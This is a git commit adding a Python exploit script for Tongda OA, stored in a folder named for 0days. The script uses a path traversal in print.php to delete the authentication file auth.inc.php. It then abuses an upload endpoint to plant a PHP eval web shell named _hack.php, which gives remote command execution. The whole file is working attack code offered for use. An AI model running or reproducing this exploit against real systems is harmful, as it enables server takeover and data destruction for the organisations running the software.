5980b93482b258049525652f138c76a2bf491cab
lyscf <69514837+lyscf@users.noreply.github.com>
2020-09-28 07:28:21 +0000

    Create 漏洞利用.py

---
+++ 0days/通达OA文件删除漏洞/漏洞利用.py
@@ -0,0 +1,27 @@
+import requests
+target="http://192.168.52.135:82"
+payload="<?php @eval($_REQUEST['cmd']);?>"
+print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
+input("Press enter to continue")
+print("[*]Deleting auth.inc.php....")
+
+url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
+requests.get(url=url)
+print("[*]Checking if file deleted...")
+url=target+"/inc/auth.inc.php"
+page=requests.get(url=url).text
+if 'No input file specified.' not in page:
+    print("[-]Failed to deleted auth.inc.php")
+    exit(-1)
+print("[+]Successfully deleted auth.inc.php!")
+print("[*]Uploading payload...")
+url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nb&repkid=/.<>./.<>./.<>./"
+files = {'FILE1': ('hack.php', payload)}
+requests.post(url=url,files=files)
+url=target+"/_hack.php"
+page=requests.get(url=url).text
+if 'No input file specified.' not in page:
+    print("[+]Filed Uploaded Successfully")
+    print("[+]URL:",url)
+else:
+    print("[-]Failed to upload file")
